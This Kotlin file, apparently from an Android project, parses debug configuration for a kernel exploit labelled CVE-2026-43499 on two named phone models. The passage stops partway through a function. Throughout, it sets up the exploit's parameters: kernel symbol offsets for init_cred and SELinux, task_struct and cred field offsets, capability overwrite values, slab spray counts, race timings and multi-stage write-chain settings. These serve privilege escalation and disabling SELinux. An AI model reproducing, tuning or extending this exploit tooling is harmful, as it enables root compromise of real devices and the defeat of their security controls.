package com.ghostlock.app.backend.backends.cve43499.config

import android.content.Context
import com.typesafe.config.Config
import com.typesafe.config.ConfigException
import com.typesafe.config.ConfigFactory
import com.typesafe.config.ConfigValueType

/**
 * 5.10 select_stack 的 fd 备份起点下界：victim pipe 上移地板 = nfds(320)+64=384。
 *
 * @note pselect 的 `F_DUPFD_CLOEXEC` 起点为 `nfds + fd_reserve_stride`；stride 小于
 *       64 会与 victim pipe 高移地板重叠，必须在配置解析层 fail-closed。
 */
private const val MIN_PSELECT_FD_RESERVE_STRIDE: Long = 64L

/**
 * CVE-2026-43499 backend-private debug 配置（**debug 专用、非 profile registry**）。
 *
 * 数据源：**debug source set** 的 `app/src/debug/assets/profile/43499/debug-a301so.conf`
 * （release 不打包；只用 typesafe config 读取，不接 profile registry / 不做发布校验）。
 * @note 分层（D7）：本对象属于 cve43499 backend-private config；request/Flow 只接收解析后的
 *   值对象，UI 与通用 data adapter 都不读取文件或引用本类型。
 *
 * 读取规则（fail-closed）：
 * - 缺键/类型不符 ⇒ 抛 [Cve43499DebugConfigException]，**不填默认值**；
 * - 只暴露 debug 注入所需参数；执行时序参数由 [executionParameters] 提供。
 *
 * @note 阶段：P0b（task-37）；debug-only，不得作为 supported profile 或发布依据。
 */
internal object Cve43499DebugConfig {
    /** assets 内的 A301SO debug 配置路径（不带 `assets/` 前缀；行为兼容保留）。 */
    internal const val ASSET_PATH: String = "profile/43499/debug-a301so.conf"

    /** assets 内的 mondrian（POCO 23013RK75C / K60，5.10.252-gki）debug 配置路径。 */
    internal const val ASSET_PATH_MONDRIAN: String = "profile/43499/debug-mondrian.conf"

    /** G08 no-pin 哨兵（Kotlin -1；JNI `get_int` 转 Native u32 0xFFFFFFFF）。 */
    internal const val NO_PIN_CPU: Int = -1

    /** CPU 编号上界（仅防御性校验；Native 仍按 _SC_NPROCESSORS_CONF 校验）。 */
    private const val MAX_CPU_INDEX: Int = 4095

    /** A301SO 5.15 内核 release 前缀（asset `release` 字段唯一来源）。 */
    private const val RELEASE_A301SO_PREFIX: String =
        "5.15.189-android13-8-00016-g51bba4309aac"

    /** mondrian 5.10 内核 release 前缀（设备 full.conf / E0 uname 证据）。 */
    private const val RELEASE_MONDRIAN_PREFIX: String =
        "5.10.252-gki-gabcbe4b2bc10"

    /** A301SO Build.DEVICE/MODEL 标识（adb 设备清单 device:A301SO）。 */
    private const val DEVICE_A301SO: String = "a301so"

    /** mondrian Build.DEVICE 标识（adb 设备清单 device:mondrian）。 */
    private const val DEVICE_MONDRIAN: String = "mondrian"

    /** mondrian Build.MODEL 标识（POCO 23013RK75C）。 */
    private const val MODEL_MONDRIAN: String = "23013rk75c"

    /**
     * 设备身份（用于选择 debug asset；纯值对象，宿主可单测选择逻辑）。
     *
     * @property device `Build.DEVICE`。
     * @property model `Build.MODEL`。
     * @property fingerprint `Build.FINGERPRINT`。
     * @property kernelRelease `System.getProperty("os.version")`（内核 release）。
     */
    internal data class DebugDeviceIdentity(
        val device: String,
        val model: String,
        val fingerprint: String,
        val kernelRelease: String,
    )

    /**
     * 读取当前设备身份（**不触 assets**；未知设备由 [selectAssetPath] fail-closed）。
     *
     * @return 设备身份；Build 字段异常时为空串（由选择逻辑判未知）。
     */
    internal fun detectDeviceIdentity(): DebugDeviceIdentity = DebugDeviceIdentity(
        device = runCatching { android.os.Build.DEVICE }.getOrDefault("").orEmpty(),
        model = runCatching { android.os.Build.MODEL }.getOrDefault("").orEmpty(),
        fingerprint = runCatching { android.os.Build.FINGERPRINT }.getOrDefault("").orEmpty(),
        kernelRelease = System.getProperty("os.version").orEmpty(),
    )

    /**
     * 按设备身份选择 debug asset（fail-closed；不静默用 A301SO 配置）。
     *
     * 判定：device/model/fingerprint/kernel-release 任一命中已知设备；两个设备同时命中
     * ⇒ `debug-config-device-ambiguous`；均不命中 ⇒ `debug-config-device-unsupported`。
     *
     * @param identity 设备身份。
     * @return asset 路径（[ASSET_PATH] / [ASSET_PATH_MONDRIAN]）。
     * @throws Cve43499DebugConfigException 未知/歧义设备。
     */
    internal fun selectAssetPath(identity: DebugDeviceIdentity): String {
        val device = identity.device.trim().lowercase()
        val model = identity.model.trim().lowercase()
        val fingerprint = identity.fingerprint.trim().lowercase()
        val release = identity.kernelRelease.trim()
        val a301so = device == DEVICE_A301SO ||
            model == DEVICE_A301SO ||
            fingerprint.contains(DEVICE_A301SO) ||
            release.startsWith(RELEASE_A301SO_PREFIX)
        val mondrian = device == DEVICE_MONDRIAN ||
            model == MODEL_MONDRIAN ||
            fingerprint.contains(DEVICE_MONDRIAN) ||
            release.startsWith(RELEASE_MONDRIAN_PREFIX)
        val label = "device=$device,model=$model,release=$release"
        return when {
            a301so && mondrian -> throw Cve43499DebugConfigException(
                "debug-config-device-ambiguous:$label",
            )
            a301so -> ASSET_PATH
            mondrian -> ASSET_PATH_MONDRIAN
            else -> throw Cve43499DebugConfigException("debug-config-device-unsupported:$label")
        }
    }

    /**
     * 从 app assets 读取并解析当前设备的 debug 配置（A301SO/mondrian；未知 fail-closed）。
     *
     * @param context 应用上下文（只用于打开 assets）。
     * @return 解析后的参数。
     * @throws Cve43499DebugConfigException 缺文件/缺键/类型不符/未知设备/release 不匹配。
     */
    internal fun load(context: Context): Cve43499DebugParameters {
        val identity = detectDeviceIdentity()
        val assetPath = selectAssetPath(identity)
        val text = try {
            context.assets.open(assetPath).bufferedReader().use { it.readText() }
        } catch (problem: Throwable) {
            throw Cve43499DebugConfigException("debug-config-missing-asset:$assetPath", problem)
        }
        val parsed = parse(text)
        verifyKernelRelease(parsed.release, identity.kernelRelease)
        return parsed
    }

    /**
     * 校验 asset release 与当前内核 release 一致（release 不匹配 fail-closed）。
     *
     * @param assetRelease asset `release` 字段。
     * @param kernelRelease 当前内核 release（可能为空=无法判定，跳过）。
     * @throws Cve43499DebugConfigException 非空且不相等。
     */
    internal fun verifyKernelRelease(assetRelease: String, kernelRelease: String) {
        val actual = kernelRelease.trim()
        if (actual.isEmpty()) return
        if (actual != assetRelease) {
            throw Cve43499DebugConfigException(
                "debug-config-release-mismatch:$assetRelease/$actual",
            )
        }
    }

    /**
     * 解析 debug 配置文本（供单测/宿主角直接调用；不触 Android API）。
     *
     * @param text HOCON 文本。
     * @return 解析后的参数。
     * @throws Cve43499DebugConfigException 缺键/类型不符。
     */
    internal fun parse(text: String): Cve43499DebugParameters {
        val config = try {
            ConfigFactory.parseString(text).resolve()
        } catch (problem: ConfigException) {
            throw Cve43499DebugConfigException("debug-config-invalid:" + problem.message, problem)
        }
        return Cve43499DebugParameters(
            release = requireString(config, "release"),
            kernelMajor = requireInt(config, "kernel_major"),
            route = parseRoute(config),
            offsets = parseOffsets(config),
            taskStruct = parseTaskStruct(config),
            cred = parseCred(config),
            kernelsnitch = DebugKernelsnitch(
                collisions = requireInt(config, "kernelsnitch.collisions"),
                mmStructSz = requireLong(config, "kernelsnitch.mm_struct_sz"),
            ),
            /* R3b：单 route 注入选择 + 三路 generator 的目标/布局参数。 */
            injection = parseInjection(config),
            generator = parseGenerator(config),
            perf = parsePerf(config),
            failStop = parseFailStop(config),
            cpu = parseExecutionCpu(config),
            race = parseExecutionRace(config),
            fastRepair = parseFastRepairFlags(config),
            finish = parseFinishParameters(config),
        )
    }

    /**
     * 解析 B6 finish settle（`finish` 段；缺段=默认 2000ms；非法 fail-closed）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return settle 参数。
     */
    private fun parseFinishParameters(config: Config): DebugFinishParameters {
        if (!config.hasPath("finish")) return DebugFinishParameters()
        val settle = requireLong(config, "finish.pre_dispatch_settle_ms")
        if (settle < 0L || settle > 10_000L) {
            throw Cve43499DebugConfigException("debug-config-invalid:finish.settle:$settle")
        }
        val expectedUid = if (config.hasPath("finish.expected_uid")) {
            requireLong(config, "finish.expected_uid")
        } else {
            0L
        }
        if (expectedUid < 0L) {
            throw Cve43499DebugConfigException("debug-config-invalid:finish.expected_uid:$expectedUid")
        }
        return DebugFinishParameters(
            preDispatchSettleMs = settle,
            expectedUid = expectedUid,
        )
    }

    /**
     * 解析 G05 fast-repair prebuild 开关（`writeChain` 段；缺段=全 false）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return 开关；段存在但缺键/非 0/1 ⇒ fail-closed。
     */
    private fun parseFastRepairFlags(config: Config): DebugFastRepairFlags {
        if (!config.hasPath("writeChain")) return DebugFastRepairFlags()
        val prebuild = requireInt(config, "writeChain.fast_repair_prebuild_enabled")
        val allowFallback = requireInt(config, "writeChain.allow_full_fallback")
        if (prebuild !in 0..1 || allowFallback !in 0..1) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:writeChain.flags:$prebuild/$allowFallback",
            )
        }
        return DebugFastRepairFlags(
            fastRepairPrebuildEnabled = prebuild == 1,
            allowFullFallback = allowFallback == 1,
        )
    }

    /**
     * 解析 G01 fail-stop 开关（`failStop.enabled`；段缺失=legacy 同形 enabled=1）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return 开关参数。
     * @throws Cve43499DebugConfigException 段存在但缺键/取值非 0/1。
     */
    private fun parseFailStop(config: Config): DebugFailStopParameters {
        if (!config.hasPath("failStop")) return DebugFailStopParameters(enabled = 1)
        val enabled = requireInt(config, "failStop.enabled")
        if (enabled !in 0..1) {
            throw Cve43499DebugConfigException("debug-config-invalid:failStop.enabled:$enabled")
        }
        return DebugFailStopParameters(enabled = enabled)
    }

    /**
     * 解析 G08 Actor CPU pin 覆盖（`execution` 段；段缺失=legacy 0/1/2）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return CPU 覆盖参数。
     * @throws Cve43499DebugConfigException 取值非法（owner/waiter 仅 -1 或 0..; consumer 禁止 -1）。
     */
    private fun parseExecutionCpu(config: Config): DebugExecutionCpu {
        if (!config.hasPath("execution")) return DebugExecutionCpu()
        val owner = optionalInt(config, "execution.owner_cpu") ?: 0
        val waiter = optionalInt(config, "execution.waiter_cpu") ?: 1
        val consumer = optionalInt(config, "execution.consumer_cpu") ?: 2
        fun cpuInvalid(cpu: Int, allowSentinel: Boolean): Boolean =
            cpu < 0 && !(allowSentinel && cpu == NO_PIN_CPU) ||
                cpu > MAX_CPU_INDEX
        if (cpuInvalid(owner, allowSentinel = true) ||
            cpuInvalid(waiter, allowSentinel = true) ||
            cpuInvalid(consumer, allowSentinel = false)
        ) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:execution.cpu:owner=$owner,waiter=$waiter,consumer=$consumer",
            )
        }
        return DebugExecutionCpu(ownerCpu = owner, waiterCpu = waiter, consumerCpu = consumer)
    }

    /**
     * 解析 task-135 `execution.race`（缺段=null=旧行为；存在则三键必须齐全）。
     *
     * fail-closed：park>0、settle>0、settle<park、route_done>park+settle、单位换算
     * 不溢出。
     *
     * @param config 已 resolve 的 HOCON。
     * @return race 参数或 null。
     * @throws Cve43499DebugConfigException 缺键/非法组合。
     */
    private fun parseExecutionRace(config: Config): DebugRaceParameters? {
        if (!config.hasPath("execution.race")) return null
        val parkMs = requireLong(config, "execution.race.park_timeout_ms")
        val routeDoneMs = requireLong(config, "execution.race.route_done_timeout_ms")
        val settleUs = requireLong(config, "execution.race.setup_settle_us")
        if (parkMs <= 0L || settleUs <= 0L ||
            parkMs > Long.MAX_VALUE / 1_000_000L ||
            routeDoneMs <= 0L ||
            routeDoneMs > Long.MAX_VALUE / 1_000_000L) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:execution.race:$parkMs/$routeDoneMs/$settleUs",
            )
        }
        val parkUs = parkMs * 1_000L
        val routeDoneUs = routeDoneMs * 1_000L
        if (settleUs >= parkUs ||
            routeDoneUs <= parkUs + settleUs) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:execution.race-window:$parkMs/$routeDoneMs/$settleUs",
            )
        }
        return DebugRaceParameters(
            parkTimeoutMs = parkMs,
            routeDoneTimeoutMs = routeDoneMs,
            setupSettleUs = settleUs,
        )
    }

    /**
     * debug 注入执行参数（P0b 显式常量；P0c generator/真机调参批次接入后可迁出）。
     *
     * @note 这些不是 A301SO 硬件事实，而是「如何注入」的策略参数；本批只用于构造
     *   debug 请求，不宣称 supported。
     */
    @Suppress("LongMethod")
    internal fun executionParameters(): DebugExecutionParameters = DebugExecutionParameters(
        /* Placement：页/slab 几何与注入 CPU/超时。 */
        placementCpu = 0,
        measurementCpu = 1,
        /* R3/共性4：旧 placement deadline 60s（audit：1s 过短，归档实测≈1.4–1.5s）。 */
        timeoutNanos = 60_000_000_000L,
        pageSize = 0x1000L,
        allocationSize = 0x8000L,
        slabOrder = 3L,
        mmStructSize = 0x400L,
        mmPartials = 5L,
        prepareSlabs = 8L,
        snitchCollisions = 8L,
        /* R3/共性4：旧 poll 1ms（原 200µs）。 */
        pollUs = 1_000L,
        requiredAlignment = 0x8000L,
        /* R3/B8：扫描窗上界收敛到 direct_map_end（原 0xffffffc000000000 过宽）。 */
        scanLowerBound = 0xffffff8000000000uL.toLong(),
        scanUpperBound = 0xffffff9000000000uL.toLong(),
        scanStep = 0x1000L,
        scanRoundLimit = 3L,
        objectsPerSlab = 32,
        prepareObjectCount = 256,
        sprayObjectCount = 192,
        preObjectCount = 31,
        postObjectCount = 32,
        /* R2（A 决策）：容量/协议域参数；Native 无同名常量。 */
        identityStart = 0xffffff8000000000uL.toLong(),
        identityEnd = 0xffffff9000000000uL.toLong(),
        leakTagNibble = 0xfL,
        leakTagShift = 56L,
        stagingCapacity = 0x10000L,
        maxContextEntries = 512L,
        maxObjectsPerSlab = 32L,
        maxMeasurementRounds = 8L,
        /* Landing：payload 大小=2*allocation；debug 占位参数。 */
        socketSendBufferSize = 1L shl 20,
        reclaimSendLimit = 4L,
        reclaimPayloadSize = 0x10000L,
        fillByte = 0x41L,
        contentGeneration = 1L,
        /* R3/B6：页接受判据（legacy2 `memory.cpp:210-227` 的参数化）。
         * multicast W1（mode=Zero + preserve_child）时 layout.right = base+0x100，
         * 第 16 位必须为 1，否则写该页会清掉 selinux_state.initialized（真机 panic）。
         * 值全部走请求字段；Native 不内置目标常量。 */
        pageAcceptRequired = 1L,
        pageAcceptOffset = 0x100L,
        pageAcceptBit = 16L,
        /* Actor：调度/预算/等待。 */
        ownerCpu = 0,
        waiterCpu = 1,
        consumerCpu = 2,
        ownerPriority = 0,
        waiterPriority = 0,
        consumerPriority = 0,
        threadCount = 3,
        prepareTimeoutNanos = 1_000_000_000L,
        parkedTimeoutNanos = 1_000_000_000L,
        executionTimeoutNanos = 1_000_000_000L,
        shutdownTimeoutNanos = 1_000_000_000L,
        /* R3/B4：旧 burst/max=1/1、lock_pi_spin=50ms、settle=50ms。 */
        consumerMax = 1L,
        consumerBurst = 1L,
        lockPiSpinNs = 50_000_000L,
        setupSettleUs = 50_000L,
        requeueExpected = 0L,
        disarmSpinLimit = 1L shl 20,
        /* Multicast：UDP 单发 stamp。 */
        multicastSocketBufferSize = 1L shl 20,
        /* R3/B2：旧 attempts=128、arm≥16；arm_hold 现为自旋次数（旧 20000，窗口内禁 syscall）。 */
        multicastOperationBudget = 128L,
        multicastTimeoutNanos = 1_000_000_000L,
        multicastAddressFamily = 2, /* AF_INET */
        multicastArmHoldNs = 20_000L,
        multicastArmSequence = 16L,
    )

    /**
     * 按 debug 配置派生执行参数（设备相关几何：mm_struct 尺寸 / snitch / 对象数）。
     *
     * 与 [executionParameters] 的差异**仅**设备事实：
     * - `mmStructSize` ← `kernelsnitch.mm_struct_sz`（A301SO 1024 / mondrian 960）；
     * - `snitchCollisions` ← `kernelsnitch.collisions`（两设备均 8）；
     * - 对象数按 **legacy floor 语义** `allocation/mm_struct_size` 派生
     *   （mondrian 32768/960=34；A301SO 32768/1024=32 数值不变）；
     * - `maxObjectsPerSlab` 至少覆盖派生对象数（mondrian 34 → 34）。
     *
     * @param debug 已解析的 debug 参数（含 kernelsnitch 实测值）。
     * @return 执行参数（其余字段沿用 [executionParameters]）。
     * @throws Cve43499DebugConfigException mm 尺寸非法/对象数不可表示。
     */
    internal fun executionParameters(debug: Cve43499DebugParameters): DebugExecutionParameters {
        val base = executionParameters()
        val mmStructSize = debug.kernelsnitch.mmStructSz
        if (mmStructSize <= 0L || mmStructSize > base.allocationSize) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:kernelsnitch.mm_struct_sz:$mmStructSize",
            )
        }
        val objectsLong = base.allocationSize / mmStructSize
        if (objectsLong <= 0L || objectsLong > Int.MAX_VALUE.toLong()) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:placement-objects:$objectsLong",
            )
        }
        val objects = objectsLong.toInt()
        return base.copy(
            mmStructSize = mmStructSize,
            snitchCollisions = debug.kernelsnitch.collisions.toLong(),
            objectsPerSlab = objects,
            prepareObjectCount = objects * base.prepareSlabs.toInt(),
            sprayObjectCount = objects * (1 + base.mmPartials.toInt()),
            preObjectCount = objects - 1,
            postObjectCount = objects,
            maxObjectsPerSlab = maxOf(base.maxObjectsPerSlab, objects.toLong()),
            /* G08：debug 配置的 CPU pin 覆盖（owner/waiter 可 -1=不 pin；consumer 必 pin）。 */
            ownerCpu = debug.cpu.ownerCpu,
            waiterCpu = debug.cpu.waiterCpu,
            consumerCpu = debug.cpu.consumerCpu,
            /* task-135/S4：execution.race 仅覆盖这三项（其余执行值不变）。 */
            parkedTimeoutNanos = debug.race?.let { it.parkTimeoutMs * 1_000_000L }
                ?: base.parkedTimeoutNanos,
            executionTimeoutNanos = debug.race?.let { it.routeDoneTimeoutMs * 1_000_000L }
                ?: base.executionTimeoutNanos,
            setupSettleUs = debug.race?.setupSettleUs ?: base.setupSettleUs,
        )
    }

    /**
     * 按 legacy floor 语义派生 placement 对象数（`allocation/mm`；不要求整除）。
     *
     * @param allocationSize 放置分配大小（pow2；由 [executionParameters] 给出）。
     * @param mmStructSize mm_struct 对象尺寸（设备实测）。
     * @return 每 slab 对象数（≥1）或 null=不可表示。
     * @note 与 legacy2 `support.cpp:564`（`ORDER3_SIZE / mm_struct_sz`）一致；
     *   A301SO 1024 整除 ⇒ 32（与旧校验数值相同），mondrian 960 ⇒ floor 34。
     */
    internal fun placementObjects(allocationSize: Long, mmStructSize: Long): Int? {
        if (allocationSize <= 0L || mmStructSize <= 0L) return null
        val objects = allocationSize / mmStructSize
        if (objects <= 0L || objects > Int.MAX_VALUE.toLong()) return null
        return objects.toInt()
    }

    /**
     * R3d 多写链（W1b/W2/W3 + fast-repair）的显式参数（debug 专用；非 A301SO 硬件事实）。
     *
     * 数据来源（只读参考）：
     * - 轮次/等待：staged `app/src/main/assets/profile/43499/execution-tuning.conf`
     *   `execution.stages`（w1_attempts=15/w1_settle_us=100000/w1_scratch_repair_attempts=3/
     *   w2_attempts=15/w2_settle_us=100000/w3_chain_rounds=3/w3_attempts=6/w3_settle_us=50000）
     *   + `legacy/session/backend/cve_2026_43499_backend.cpp:49-140,300-340`（W1b/W3 的
     *   usleep(50000)/slab_drain 与 W3-0 leaf dir attempts=4/settle=50000）；
     * - fast-repair 时序：`legacy2/core/race_session.cpp.disabled:147-148`
     *   （fast_repair_delay_us=5000 / fast_repair_window_ns=20_000_000）；
     * - task thread_info flags 偏移：`legacy2/core/target.h:208`（0x00，5.15 结构事实）。
     *
     * @note 阶段：R3d；这些是「如何注入」的策略参数，不是 A301SO 硬件事实。当前以显式
     *   常量承载（与 [executionParameters] 同债）；P0c 调参批可迁入 debug 配置。
     */
    internal fun writeChainParameters(): DebugWriteChainParameters = DebugWriteChainParameters(
        w1Attempts = 15,
        w1SettleUs = 100_000L,
        w1bAttempts = 3,
        w1bSettleUs = 50_000L,
        w2Attempts = 15,
        w2SettleUs = 100_000L,
        fastRepairSettleUs = 5_000L,
        fastRepairParkedTimeoutNanos = 20_000_000L,
        fastRepairLockPiSpinNs = 5_000_000L,
        w3ChainRounds = 3,
        w3Attempts = 6,
        w3SettleUs = 50_000L,
        w3LeafProbeAttempts = 4,
        w3LeafProbeSettleUs = 50_000L,
        attemptBackoffUs = 100_000L,
        verifyBackoffUs = 50_000L,
        threadInfoFlagsOffset = 0L,
    )

    /**
     * 按 debug 配置派生多写链参数（G05 flags 透传；其余显式常量不变）。
     *
     * @param debug 已解析 debug 参数。
     * @return 参数（fastRepairPrebuildEnabled/allowFullFallback 来自 `writeChain` 段）。
     */
    internal fun writeChainParameters(debug: Cve43499DebugParameters): DebugWriteChainParameters =
        writeChainParameters().copy(
            fastRepairPrebuildEnabled = debug.fastRepair.fastRepairPrebuildEnabled,
            allowFullFallback = debug.fastRepair.allowFullFallback,
        )

    /**
     * 解析 R3e perf 采样参数（`perf` 段）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return 参数对象；缺 `perf` 段返回 null（perf 路径禁用，默认关闭）。
     * @throws Cve43499DebugConfigException `perf` 段存在但缺键/类型不符（fail-closed）。
     * @note 默认关闭证据：debug 资产 `perf.enabled=0`；release 不打包 debug 资产。
     */
    private fun parsePerf(config: Config): DebugPerfParameters? {
        if (!config.hasPath("perf")) return null
        val attr = "perf.attr"
        return DebugPerfParameters(
            enabled = requireInt(config, "perf.enabled"),
            attrType = requireLong(config, "$attr.type"),
            attrConfig = requireLong(config, "$attr.config"),
            attrSamplePeriod = requireLong(config, "$attr.sample_period"),
            attrSampleType = requireLong(config, "$attr.sample_type"),
            attrSampleRegsIntr = requireLong(config, "$attr.sample_regs_intr"),
            attrFlags = requireLong(config, "$attr.flags"),
            attrDisabled = requireLong(config, "$attr.disabled"),
            excludeUser = requireLong(config, "perf.exclude.user"),
            excludeHv = requireLong(config, "perf.exclude.hv"),
            excludeIdle = requireLong(config, "perf.exclude.idle"),
            autoEnable = requireLong(config, "perf.auto_enable"),
            ringPages = requireLong(config, "perf.ring_pages"),
            pumpIterations = requireLong(config, "perf.pump_iterations"),
            pumpBudgetNanos = requireLong(config, "perf.pump_budget_nanos"),
            maxPasses = requireInt(config, "perf.max_passes"),
            minVotesFloor = requireLong(config, "perf.min_votes_floor"),
            minVotesRatio = requireDouble(config, "perf.min_votes_ratio"),
            taskAlignment = requireLong(config, "perf.task_alignment"),
            registerCount = requireInt(config, "perf.register_count"),
            spRegisterIndex = requireInt(config, "perf.sp_register_index"),
            candidateCapacity = requireInt(config, "perf.candidate_capacity"),
            requireAlignment = requireInt(config, "perf.require_alignment"),
            requireSpEvidence = requireInt(config, "perf.require_sp_evidence"),
            settleAfterAcquireUs = requireLong(config, "perf.settle_after_acquire_us"),
        )
    }

    /** @return Double 键；缺失/类型不符 ⇒ fail-closed。 */
    private fun requireDouble(config: Config, path: String): Double =
        configValue(path, "double") {
            if (!config.hasPath(path)) {
                throw Cve43499DebugConfigException("debug-config-missing:$path")
            }
            config.getDouble(path)
        }

    /** @return 字符串键；缺失/类型不符 ⇒ fail-closed。 */
    private fun requireString(config: Config, path: String): String =
        configValue(path, "string") {
            if (!config.hasPath(path)) throw Cve43499DebugConfigException("debug-config-missing:$path")
            config.getString(path)
        }

    /** @return Int 键；缺失/类型不符 ⇒ fail-closed。 */
    private fun requireInt(config: Config, path: String): Int =
        configValue(path, "int") {
            if (!config.hasPath(path)) throw Cve43499DebugConfigException("debug-config-missing:$path")
            config.getInt(path)
        }

    /** @return Long 键；缺失/类型不符 ⇒ fail-closed。 */
    private fun requireLong(config: Config, path: String): Long =
        configValue(path, "long") {
            if (!config.hasPath(path)) throw Cve43499DebugConfigException("debug-config-missing:$path")
            config.getLong(path)
        }

    /** @return 可空 Long 键；缺失 ⇒ null（仅用于协议中的显式 null 字段）。 */
    private fun optionalLong(config: Config, path: String): Long? =
        configValue(path, "long?") {
            if (!config.hasPath(path) || config.getIsNull(path)) {
                null
            } else {
                config.getLong(path)
            }
        }

    /** @return 可空 Int 键；缺失 ⇒ null。 */
    private fun optionalInt(config: Config, path: String): Int? =
        configValue(path, "int?") {
            if (!config.hasPath(path) || config.getIsNull(path)) {
                null
            } else {
                config.getInt(path)
            }
        }

    private inline fun <T> configValue(path: String, kind: String, read: () -> T): T = try {
        read()
    } catch (problem: Cve43499DebugConfigException) {
        throw problem
    } catch (problem: Throwable) {
        throw Cve43499DebugConfigException("debug-config-bad-type:$path:$kind", problem)
    }

    private fun parseRoute(config: Config): DebugMulticastRoute {
        /* HOCON 列表索引不是路径段：用 getConfigList 取第一个元素再进 multicast_waiter。 */
        val route = try {
            config.getConfigList("route").firstOrNull()
                ?: throw Cve43499DebugConfigException("debug-config-missing:route.0")
        } catch (problem: Cve43499DebugConfigException) {
            throw problem
        } catch (problem: Throwable) {
            throw Cve43499DebugConfigException("debug-config-bad-type:route", problem)
        }
        val multicast = try {
            route.getConfig("multicast_waiter")
        } catch (problem: Throwable) {
            throw Cve43499DebugConfigException(
                "debug-config-missing:route.0.multicast_waiter",
                problem,
            )
        }
        return DebugMulticastRoute(
            waiterOff = requireInt(multicast, "waiter_off"),
            bufferSize = requireInt(multicast, "buffer_size"),
            taskOffset = requireInt(multicast, "task_offset"),
            lockOffset = requireInt(multicast, "lock_offset"),
            compactWaiter = requireInt(multicast, "compact_waiter"),
        )
    }

    private fun parseOffsets(config: Config): DebugOffsets = DebugOffsets(
        initTask = requireLong(config, "offset.init_task"),
        initCred = requireLong(config, "offset.init_cred"),
        emptyZeroPage = requireLong(config, "offset.empty_zero_page"),
        rootTaskGroup = requireLong(config, "offset.root_task_group"),
        selinuxEnforcing = requireLong(config, "offset.selinux_enforcing"),
        selinuxBlobSizes = requireLong(config, "offset.selinux_blob_sizes"),
        securityHookHeads = requireLong(config, "offset.security_hook_heads"),
        slideNfulnlLogger = requireLong(config, "offset.slide_nfulnl_logger"),
        slideBootId = requireLong(config, "offset.slide_boot_id"),
        slideLoggers01 = requireLong(config, "offset.slide_loggers_0_1"),
    )

    private fun parseTaskStruct(config: Config): DebugTaskStruct {
        val prefix = "task_struct"
        return DebugTaskStruct(
            prio = requireInt(config, "$prefix.prio"),
            normalPrio = requireInt(config, "$prefix.normal_prio"),
            schedTaskGroup = requireLong(config, "$prefix.sched_task_group"),
            piLock = requireLong(config, "$prefix.pi_lock"),
            piWaiters = requireLong(config, "$prefix.pi_waiters"),
            piTopTask = requireLong(config, "$prefix.pi_top_task"),
            piBlockedOn = requireLong(config, "$prefix.pi_blocked_on"),
            pid = requireLong(config, "$prefix.pid"),
            tgid = requireLong(config, "$prefix.tgid"),
            atomicFlags = requireLong(config, "$prefix.atomic_flags"),
            realCred = requireLong(config, "$prefix.real_cred"),
            cred = requireLong(config, "$prefix.cred"),
            comm = requireLong(config, "$prefix.comm"),
            tasks = requireLong(config, "$prefix.tasks"),
            seccomp = requireLong(config, "$prefix.seccomp"),
        )
    }

    private fun parseCred(config: Config): DebugCred {
        val prefix = "cred"
        return DebugCred(
            capsOffset = requireLong(config, "$prefix.caps_offset"),
            copySize = requireLong(config, "$prefix.copy_size"),
            usageOffset = optionalLong(config, "$prefix.usage_offset"),
            usageValue = requireLong(config, "$prefix.usage_value"),
            capsCount = requireLong(config, "$prefix.caps_count"),
            capsValue = requireLong(config, "$prefix.caps_value"),
            ref0Offset = optionalLong(config, "$prefix.ref0_offset"),
            ref1Offset = optionalLong(config, "$prefix.ref1_offset"),
            ref2Offset = optionalLong(config, "$prefix.ref2_offset"),
            ref3Offset = optionalLong(config, "$prefix.ref3_offset"),
            refCount = optionalLong(config, "$prefix.ref_count"),
            ref0Image = optionalLong(config, "$prefix.ref0_image"),
            ref1Image = optionalLong(config, "$prefix.ref1_image"),
            ref2Image = optionalLong(config, "$prefix.ref2_image"),
            ref3Image = optionalLong(config, "$prefix.ref3_image"),
        )
    }

    /**
     * 解析单 route 注入选择（`injection.primitive`）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return route 选择（单值，不存在 fallback/默认）。
     * @throws Cve43499DebugConfigException 缺键/未知取值。
     */
    private fun parseInjection(config: Config): DebugInjection {
        val token = requireString(config, "injection.primitive")
        val primitive = when (token) {
            "multicast" -> DebugPrimitiveKind.MULTICAST
            "pselect" -> DebugPrimitiveKind.PSELECT
            "tcp_zerocopy" -> DebugPrimitiveKind.TCP_ZEROCOPY
            else -> throw Cve43499DebugConfigException(
                "debug-config-invalid:injection.primitive:" + token,
            )
        }
        val victimToken = requireString(config, "injection.victim")
        val victim = when (victimToken) {
            "process" -> DebugVictimTransport.PROCESS
            "jni-spawn" -> DebugVictimTransport.JNI_SPAWN
            /* task-86：common opt-in（默认仍 process；未知 fail-closed）。 */
            "common" -> DebugVictimTransport.COMMON
            else -> throw Cve43499DebugConfigException(
                "debug-config-invalid:injection.victim:" + victimToken,
            )
        }
        return DebugInjection(primitive = primitive, victim = victim)
    }

    /**
     * 解析三路 generator 的目标事实/布局参数（`generator` 段）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return generator 参数（全部必填，无默认）。
     * @throws Cve43499DebugConfigException 缺键/类型不符。
     */
    private fun parseGenerator(config: Config): DebugGeneratorParameters {
        val address = requireConfig(config, "generator.address_model")
        val payload = requireConfig(config, "generator.payload")
        val multicast = requireConfig(config, "generator.multicast")
        val pselect = requireConfig(config, "generator.pselect")
        val tcp = requireConfig(config, "generator.tcp")
        val parsed = DebugGeneratorParameters(
            addressModel = DebugAddressModel(
                directMapBase = longOf(address, "generator.address_model", "direct_map_base"),
                kernelPhysLoad = longOf(address, "generator.address_model", "kernel_phys_load"),
                kernelPhysOffset = longOf(address, "generator.address_model", "kernel_phys_offset"),
            ),
            payload = DebugPayloadLayout(
                lockOff = longOf(payload, "generator.payload", "lock_off"),
                w0Off = longOf(payload, "generator.payload", "w0_off"),
                rightOff = longOf(payload, "generator.payload", "right_off"),
                leftOff = longOf(payload, "generator.payload", "left_off"),
                fakeTaskOff = longOf(payload, "generator.payload", "fake_task_off"),
                skbDataDelta = longOf(payload, "generator.payload", "skb_data_delta"),
